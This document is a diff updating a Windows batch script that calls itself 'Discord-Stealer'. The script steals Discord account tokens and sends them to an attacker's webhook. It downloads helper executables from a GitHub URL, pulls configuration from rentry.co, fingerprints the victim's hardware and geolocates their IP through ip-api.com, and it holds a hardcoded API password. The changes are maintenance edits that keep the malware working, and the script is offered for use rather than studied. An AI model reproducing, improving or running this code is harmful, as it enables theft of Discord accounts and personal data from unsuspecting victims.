@@ -2,12 +2,12 @@
 setlocal enabledelayedexpansion
 
 :: <Settings>
-set "Version=2.6"
+set "Version=2.6.1"
 set "APIPasswords=V4KG2CPM-QXWU4PM2"
 set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe rentry.exe nonAscii.exe
 set "pasteLocation=%temp%\DAS v!Version!\WebPaste.txt"
 set DefaultGateway=https://github.com/agamsol/Discord-Stealer/raw/main/
-set "DefaultIdentifier=10000-00000"
+set "DefaultIdentifier=B2Z9A-Z31RJ"
 set "JsonValues=token version CreationDate Enabled author.ID author.Endpoint author.Access"
 set "EncodeLength=4"
 set "ENCODE.LOWER[/]=djFW" & set "DECODE.LOWER[djFW]=/"
@@ -35,13 +35,11 @@ set notLegacy=%~2
 if not defined notLegacy set Identifier=%~1
 for %%a in (%*) do (
     set /a Args.length+=1
-    if /i "%%a"==""--background"" (
-        set "Arg[!Args.length!]=%%~a"
-    ) else ( set "Arg[!Args.length!]=%%a" )
+    set "Arg[!Args.length!]=%%~a"
 )
 for /L %%a in (1 1 !Args.length!) do (
     for %%b in ("identifier" "builds" "background") do (
-        if /i "!Arg[%%a]!"=="--%%~b" (
+            if /i "!Arg[%%a]!"=="--%%~b" (
             set nextArg=%%a
             set /a nextArg+=1
             if /i "%%~b"=="identifier" (
@@ -130,16 +128,13 @@ for %%a in (ID Endpoint Access) do (
     call :DECODE "!Json.author.%%a!"
     set "Json.author.%%a=!DecodedString!"
 )
-if "!Json.version!"=="2.5" set "Json.version=2.6"
+for %%a in ("2.5" "2.6" "2.6.1") do if "!Json.version!"=="%%~a" set "Json.version=2.6.1"
 set "WebURL=https://rentry.co/!Json.author.Endpoint!"
 set "PermaAccess=!Json.author.Access!"
-set IdentifierDATA=!Error_Description!
-set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%AccountsStolen%!"
-call :LoadMessagePlaceHolders
 :: </Load Identifier>
 
 :: <Check META DATA>
- for %%a in ("2.6") do if "%%~a"=="!Json.version!" set compatible=true
+ if "!version!"=="!Json.version!" set compatible=true
  if not "!Compatible!"=="true" (
      set Show_Notifications=true
      set "APP_Nickname=System"
@@ -148,12 +143,14 @@ call :LoadMessagePlaceHolders
   if /i "!json.Enabled!"=="false" (
      set Show_Notifications=true
      set "APP_Nickname=System"
-     call :ERRORS "false" "-" "This identifier is disabled.\nIdentifier: !Json.token!" "{NT}" "true"
+     call :ERRORS "false" "-" "This identifier is disabled.\nIdentifier: !Json.token!" "{NT}" "false"
  )
 :: </Check META DATA>
 
 :: <Get Software & Hardware information>
+ chcp 437>nul
  for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
+ chcp 437>nul
  for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
  for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
  for /f "delims=" %%a in ('call "!File[3]!" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
@@ -171,9 +168,12 @@ for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_
         call :ERRORS "false" "-" "The Identifier is missing settings and the APP is unable to load.\nIdentifier: !Json.token!" "{NT}" "false"
     )
 )
-title !APP_Nickname!
 call :DATABASE 0
 call :Validate_Webhook
+
+set IdentifierDATA=!Error_Description!
+set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%AccountsStolen%!"
+call :LoadMessagePlaceHolders
 :: </Load User Settings for the Identifier>
 
 :: <Collect Discord Builds Information>
@@ -187,6 +187,7 @@ if defined Error (
 :: </Collect Discord Builds Information>
 
 :: <Prepare and Send Account(s)>
+title !APP_Nickname!
 set IdentifierDATA=!Success_Description!
 set "IdentifierDATA=!IdentifierDATA:{TotalFailures}=%Failures%!"
 call :LoadMessagePlaceHolders
